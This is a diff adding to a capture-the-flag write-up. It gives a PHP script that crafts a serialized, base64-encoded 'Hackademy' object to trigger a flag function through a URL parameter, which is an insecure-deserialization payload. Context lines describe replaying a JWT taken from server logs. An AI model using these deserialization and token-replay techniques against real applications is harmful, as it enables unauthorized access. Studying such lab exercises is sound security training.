@@ -46,5 +46,29 @@ Look at the logs on the server, we can see his JWT token.<br>
 Go to ```URL.ctf/?identity=(insert JWT)``` (reminder; the token is only valid for 20mins)
 
 ### Serialize 101
+Look at the source code and change the WelcomeMessage function by the function that outputs the base64 string, GiveMeFlagPrettyPlease()<br>
+This is the final payload:<br>
+```<?php
+    class Hackademy{
+        private $call = "GiveMeFlagPrettyPlease";
+    }   
+    $serialized = serialize(new Hackademy());
+
+    // Output
+    echo "Serialized:\n";
+    echo $serialized;
+    echo "\n";
+    echo "Encoded:\n";
+    echo base64_encode($serialized);
+    echo "\n";
+?>```
+
+I then use the output in the URL parameter, and it gives me the flag :)
+
+### Forgery 101
+
+### Forgery 102
+
+### Forgery 103
 
 
